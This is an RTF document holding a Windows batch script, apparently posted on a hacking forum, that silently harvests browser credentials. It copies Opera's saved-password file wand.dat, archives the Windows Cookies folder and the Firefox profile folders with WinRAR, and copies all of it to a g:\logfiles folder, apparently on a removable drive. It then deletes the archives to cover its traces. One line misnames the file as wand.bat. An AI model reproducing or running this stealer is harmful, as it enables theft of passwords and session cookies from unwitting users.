{\rtf1\ansi\ansicpg1251\cocoartf1561\cocoasubrtf400
{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
{\colortbl;\red255\green255\blue255;\red255\green255\blue255;\red29\green29\blue29;\red230\green230\blue230;
}
{\*\expandedcolortbl;;\cssrgb\c100000\c100000\c100000;\cssrgb\c15294\c15294\c15294;\cssrgb\c92157\c92157\c92157;
}
\paperw11900\paperh16840\margl1440\margr1440\vieww10800\viewh8400\viewkind0
\deftab720
\pard\pardeftab720\partightenfactor0
{\field{\*\fldinst{HYPERLINK "https://youhack.ru/members/39176/"}}{\fldrslt 
\f0\fs28 \cf2 \cb3 \expnd0\expndtw0\kerning0
@Echo}}
\f0\fs28 \cf4 \cb3 \expnd0\expndtw0\kerning0
 off\cb1 \
\pard\pardeftab720\partightenfactor0
\cf4 \cb3 @if not exist \\logfiles md \\logfiles >nul\cb1 \
\cb3 c:\cb1 \
\cb3 chdir %APPDATA%\\Opera\\Opera\\profile\\ >nul\cb1 \
\cb3 copy wand.dat g:\\logfiles\\wand.dat >nul\cb1 \
\cb3 c:\cb1 \
\cb3 chdir %APPDATA%\\Opera\\Opera 10 Preview!\\profile\\ >nul\cb1 \
\cb3 copy wand.dat g:\\logfiles\\ >nul\cb1 \
\cb3 c:\cb1 \
\cb3 chdir %ProgramFiles%\\Opera AC 3.7\\profile\cb1 \
\cb3 copy wand.bat g:\\logfiles\\ >nul\cb1 \
\cb3 c:\cb1 \
\cb3 chdir %UserProfile%\\Cookies\\\cb1 \
\cb3 "C:\\Program Files\\WinRAR\\WinRAR.exe" u -r -y -ep1 Cookies.rar *.*\cb1 \
\cb3 copy Cookies.rar g:\\logfiles\\ >nul\cb1 \
\cb3 del Cookies.rar >nul\cb1 \
\cb3 c:\cb1 \
\cb3 chdir %APPDATA%\\Mozilla\\Firefox\\ >nul\cb1 \
\cb3 "C:\\Program Files\\WinRAR\\WinRAR.exe" u -r -y -ep1 Profiles.rar *.*\cb1 \
\cb3 copy Profiles.rar g:\\logfiles\\ >nul\cb1 \
\cb3 del profiles.rar >nul}